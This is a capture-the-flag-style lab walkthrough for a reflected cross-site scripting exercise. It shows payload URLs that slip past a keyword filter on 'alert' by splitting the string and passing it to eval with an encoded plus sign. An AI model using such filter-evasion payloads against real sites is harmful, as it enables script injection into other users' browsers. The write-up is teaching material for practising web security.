XSS 05

In this example, the <script> tag is accepted and gets echoed back. But as soon as you try to inject a call to alert, the PHP script stops its execution. The problem seems to come from a filter on the word alert.

Using JavaScript's eval and String.fromCharCode(), you should be able to get an alert box without using the word alert directly. String.fromCharCode() will decode an integer (decimal value) to the corresponding character.

You can write a small tool to transform your payload to this format using your favorite scripting language.

Using this trick and the ascii table, you can easily generate the string: alert(1) and call eval on it.

 To finish this exercise, you need to trigger a pop-up (alert or confirm) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) 
 as argument <script>alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8')</script>. 

 You can access this exercise using the following URL: http://ptl-1926620d-4ffa5bc7.libcurl.st/. 

    Steps:
        1) Visit the given URL: http://ptl-1926620d-4ffa5bc7.libcurl.st/. 
        2) After opening that link we'll be redirected to: http://ptl-1926620d-4ffa5bc7.libcurl.st/index.php?name=hacker
        3) Put some changes just like: hackerlol in parameter. It'll be reflected.
        4) Let's try with (+) : 
            http://ptl-1926620d-4ffa5bc7.libcurl.st/index.php?name=hacker<script>("al"+"ert(1)")</script>
            But we need to encode the '+' to '%2b' as:
            http://ptl-1926620d-4ffa5bc7.libcurl.st/index.php?name=hacker<script>("al"%2b"ert(1)")</script>
        5) Again as we can use JavaScript's eval and String.fromCharCode()
            Look how it forms:
            ----> http://ptl-1926620d-4ffa5bc7.libcurl.st/index.php?name=hacker<script>eval("al"+"ert(1)")</script>

            ----> http://ptl-1926620d-4ffa5bc7.libcurl.st/index.php?name=hacker<script>eval("al"%2b"ert('1')")</script> 

        6) Finally we can pop-out our UUID as: 
            ----> http://ptl-1926620d-4ffa5bc7.libcurl.st/index.php?name=hacker<script>eval("al"%2b"ert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8')")</script>
                    Paste the url and submit.
        7) Bravo!! We've solved this lab too.

        Happy Hacking!! :)
